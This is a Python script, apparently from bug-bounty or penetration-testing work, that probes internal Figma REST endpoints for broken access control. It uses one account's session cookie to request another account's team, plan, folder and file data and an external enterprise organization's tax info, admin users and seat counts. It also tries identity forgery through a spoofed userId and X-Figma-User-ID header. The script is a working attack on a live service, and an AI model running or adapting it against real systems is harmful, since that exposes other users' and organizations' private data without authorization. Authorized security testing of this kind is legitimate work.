"""sinatra_resolver REST 通道越权矩阵(新攻击面):
livegraph view 的 REST 化身 /api/internal/livegraph/sinatra_resolver/*
B 会话(cookie) → A 的 team/plan/folder/file/外部企业 org vs B 自己(对照)
附带:userId 参数身份伪造变体(userId=A_uid + B cookie)
参数格式确定性来源:js_editor/1037 chunk queryParams 定义
"""
import sys, io, json, urllib.request, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_TEAM = "1666382706663462213"
B_TEAM = "1667396394890946753"
A_PLAN = "cc6b6125-a07f-4d39-a54c-50ef65f33919"   # A 的 planRecordId
B_PLAN = "46b1d26c-c802-4ef1-a83c-d96cfe7295f4"
A_F2 = "qzDqStIDJyGbthpKiuvfwg"
B_F = "xFETb3KJ8wh2U8wjD9jJeY"
A_FOLDER = "634606970"
B_FOLDER = "636027529"
EXT_ORG = "1484997479016537761"   # 外部企业组织(organization::...)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def call(label, endpoint, params, uid_override=None):
    qs = urllib.parse.urlencode(params)
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Cookie": CK_B, "X-Figma-User-ID": uid_override or B_UID}
    req = urllib.request.Request(
        f"https://www.figma.com/api/internal/livegraph/sinatra_resolver/{endpoint}?{qs}",
        headers=hdrs)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        raw = r.read().decode(errors='replace')
        print(f"[{label}] {r.status} {raw[:400]}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] {e.code} {raw[:400]}")
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:70]}")

print("========== B→外部企业 org(越权面,最敏感) ==========")
call("tax_info(企业org)", "tax_info", {"org_id": EXT_ORG, "userId": B_UID})
call("org_member_count", "org_member_count", {"org_id": EXT_ORG, "userId": B_UID})
call("org_admin_users_info", "org_admin_users_info", {"org_id": EXT_ORG, "userId": B_UID})
call("org_admin_new_editors_info", "org_admin_new_editors_info", {"org_id": EXT_ORG, "userId": B_UID, "license_type": "design"})
call("org_workspace_count", "org_workspace_count", {"org_id": EXT_ORG, "userId": B_UID})
call("org_discoverable_team_count", "org_discoverable_team_count", {"org_id": EXT_ORG, "userId": B_UID})
call("org_web_published_unprotected_count", "org_web_published_unprotected_count", {"org_id": EXT_ORG, "userId": B_UID})
call("assigned_seat_counts(企业org)", "assigned_seat_counts", {"plan_parent_id": EXT_ORG, "plan_type": "Org", "userId": B_UID})
call("available_seat_counts(企业org)", "available_seat_counts", {"plan_parent_id": EXT_ORG, "plan_type": "Org", "userId": B_UID})

print("\n========== B→A(越权面) ==========")
call("tax_info(A team)", "tax_info", {"team_id": A_TEAM, "userId": B_UID})
call("plan_user_count(A)", "plan_user_count", {"plan_id": A_PLAN, "userId": B_UID})
call("plan_ai_usage_monthly(A)", "plan_ai_usage_monthly", {"plan_id": A_PLAN, "userId": B_UID})
call("plan_user_ai_usage_monthly(A→A用户)", "plan_user_ai_usage_monthly", {"plan_id": A_PLAN, "target_user_id": A_UID, "userId": B_UID})
call("plan_user_group_count(A)", "plan_user_group_count", {"plan_id": A_PLAN, "userId": B_UID})
call("plan_editable_teams(A)", "plan_editable_teams", {"plan_id": A_PLAN, "userId": B_UID})
call("assigned_seat_counts(A team)", "assigned_seat_counts", {"plan_parent_id": A_TEAM, "plan_type": "Team", "userId": B_UID})
call("available_seat_counts(A team)", "available_seat_counts", {"plan_parent_id": A_TEAM, "plan_type": "Team", "userId": B_UID})
call("bundles_for_plan(A)", "bundles_for_plan", {"plan_parent_id": A_TEAM, "plan_type": "Team", "file_key": A_F2, "userId": B_UID})
call("resource_connection_sharing_group_users(A文件)", "resource_connection_sharing_group_users", {"fileKey": A_F2, "userId": B_UID})
call("file_custom_tool_ids(A文件)", "file_custom_tool_ids", {"file_key": A_F2, "userId": B_UID})
call("project_file_count(A folder)", "project_file_count", {"folder_id": A_FOLDER, "userId": B_UID})
call("folder_join_links_supported(A folder)", "folder_join_links_supported", {"folder_id": A_FOLDER, "userId": B_UID})
call("ancestor_transfer_requests(A folder)", "ancestor_transfer_requests", {"resource_type": "folder", "resource_id": A_FOLDER, "userId": B_UID})
call("descendant_transfer_requests(A folder)", "descendant_transfer_requests", {"resource_type": "folder", "resource_id": A_FOLDER, "userId": B_UID})
call("inherited_folder_roles(A folder)", "inherited_folder_roles", {"folder_id": A_FOLDER, "resource_type": "file", "userId": B_UID})
call("inherited_user_group_permissions(A folder)", "inherited_user_group_permissions", {"folder_id": A_FOLDER, "resource_type": "file", "userId": B_UID})
call("associated_profile_users_team_admins(A)", "associated_profile_users_team_admins", {"profileId": A_UID, "teamId": A_TEAM, "userId": B_UID})
call("team_discoverable_libraries(A team)", "team_discoverable_libraries", {"team_id": A_TEAM, "userId": B_UID})
call("connected_projects_for_plan(A)", "connected_projects_for_plan", {"plan_parent_id": A_TEAM, "plan_type": "team", "userId": B_UID})

print("\n========== 身份伪造变体(userId=A_uid + B cookie) ==========")
call("伪 tax_info(A team, userId=A)", "tax_info", {"team_id": A_TEAM, "userId": A_UID})
call("伪 plan_ai_usage_monthly(userId=A)", "plan_ai_usage_monthly", {"plan_id": A_PLAN, "userId": A_UID})
call("伪 org_admin_users_info(userId=A)", "org_admin_users_info", {"org_id": EXT_ORG, "userId": A_UID})

print("\n========== B→自己(对照,验证格式) ==========")
call("B tax_info", "tax_info", {"team_id": B_TEAM, "userId": B_UID})
call("B plan_user_count", "plan_user_count", {"plan_id": B_PLAN, "userId": B_UID})
call("B plan_ai_usage_monthly", "plan_ai_usage_monthly", {"plan_id": B_PLAN, "userId": B_UID})
call("B assigned_seat_counts", "assigned_seat_counts", {"plan_parent_id": B_TEAM, "plan_type": "Team", "userId": B_UID})
call("B available_seat_counts", "available_seat_counts", {"plan_parent_id": B_TEAM, "plan_type": "Team", "userId": B_UID})
call("B project_file_count", "project_file_count", {"folder_id": B_FOLDER, "userId": B_UID})
call("B resource_connection_sharing_group_users", "resource_connection_sharing_group_users", {"fileKey": B_F, "userId": B_UID})
call("B associated_profile_users_team_admins", "associated_profile_users_team_admins", {"profileId": B_UID, "teamId": B_TEAM, "userId": B_UID})
